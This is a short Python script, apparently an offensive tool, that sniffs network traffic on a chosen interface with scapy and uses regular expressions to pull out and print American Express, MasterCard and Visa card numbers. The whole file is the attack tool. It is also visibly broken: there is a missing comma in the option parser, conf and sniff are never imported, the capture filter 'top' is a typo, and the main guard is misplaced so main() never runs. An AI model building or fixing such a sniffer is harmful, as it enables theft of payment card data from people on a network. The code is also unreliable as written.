'''
Credit Card Sniffer
'''

import re
import optparse
from scapy import all as scapy

def findCreditCard(raw):
    #raw = pkt.sprint('Raw.load%')
    americaRe = re.findall("3[47][0-9]{13}",raw)
    masterRe = re.findall("5[1-5][0-9]{14}",raw)
    visaRe = re.findall("4[0-9]{12}(?:[0-9]{3})?", raw)

    if americaRe:
        print("[+] Found American Express Card: " + americaRe[0])

    if masterRe:
        print("[+] Found MasterCard Express Card: " + masterRe[0])

    if visaRe:
        print("[+] Found Visa Card: " + visaRe[0])

def main():
    parser = optparse.OptionParser('usage % prog -i<interface>')
    parser.add_option('-i', dest='interface', type='string'\
                      help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print(parser.usage)
        exit(0)

    else:
        conf.iface = options.interface
    
    try:
        print('[+] Starting Credit Card Sniffer.')
        sniff(filter='top',prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

    if __name__ == "__main__":
        main()